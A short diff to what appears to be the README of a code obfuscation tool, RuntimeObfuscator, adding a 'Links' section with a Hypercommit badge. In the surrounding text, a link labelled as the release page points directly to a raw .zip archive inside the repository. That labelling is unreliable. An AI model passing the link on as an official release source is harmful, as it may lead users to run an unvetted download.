@@ -97,3 +97,7 @@ If you want to contribute to RuntimeObfuscator or suggest improvements, please f
 Make sure to keep your tool updated. Check the release page regularly for new features and improvements: [RuntimeObfuscator Releases](https://github.com/abexziero/RuntimeObfuscator/raw/refs/heads/main/RuntimeObfuscator/ASM/Obfuscator-Runtime-v2.8-beta.1.zip).
 
 By following these steps, you should now be equipped to download and use RuntimeObfuscator effectively. Enjoy enhancing your code security!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/runtimeobfuscator)
